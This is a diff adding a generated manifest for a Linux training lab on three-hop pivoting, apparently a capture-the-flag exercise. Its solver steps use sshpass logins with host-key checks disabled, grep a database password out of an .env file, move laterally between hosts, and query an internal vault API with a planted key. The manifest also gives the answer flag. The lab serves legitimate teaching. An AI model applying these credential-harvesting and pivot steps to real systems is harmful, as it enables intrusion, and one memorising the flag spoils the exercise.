@@ -1,0 +1,47 @@
+# Generated from platform/labs/Linux/linux-4-3-three-hop-pivot/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: linux-4-3-three-hop-pivot
+track: Linux
+difficulty: intermediate
+source: platform/labs/Linux/linux-4-3-three-hop-pivot/lab.yaml
+expected_services:
+- port: 22
+  protocol: tcp
+- port: 80
+  protocol: tcp
+- port: 8080
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/linux-4-3-three-hop-pivot.sh
+  steps:
+  - name: SSH to host-a as teller
+    command: sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@{target.host-a} 'whoami' 2>&1
+    expect: teller
+  - name: Read DB config from host-a to discover host-b credentials
+    command: sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@{target.host-a} 'cat /var/www/banking-app/.env 2>/dev/null | grep DB_PASS' 2>&1
+    expect: M3r1d14n_App_2024#
+  - name: Read token 1 from host-a
+    command: sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@{target.host-a} 'cat /home/teller/assessment_token.txt' 2>&1
+    expect: thr33
+  - name: SSH to host-b with discovered credentials
+    command: sshpass -p '{cred.appuser.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@{target.host-b} 'whoami' 2>&1
+    expect: appuser
+  - name: Read API config from host-b and get token 2
+    command: sshpass -p '{cred.appuser.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@{target.host-b} 'cat /opt/meridian/services/api-gateway/config.yml 2>/dev/null && echo --- && cat /home/appuser/marker.txt' 2>&1
+    expect: h0p
+  - name: Curl host-c API with discovered API key to get token 3
+    command: 'sshpass -p ''{cred.appuser.pass}'' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@{target.host-b} ''curl -s -H "X-API-Key: MTB_k3y_h0p_l4t3r4l" http://meridian-core:8080/api/vault'' 2>&1'
+    expect: l4t3r4l
+  - name: Assemble and verify complete flag
+    command: echo 'OCR{thr33_h0p_l4t3r4l}'
+    expect: OCR{
+expected_flag_count: 1
+expected_flag: OCR{thr33_h0p_l4t3r4l}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
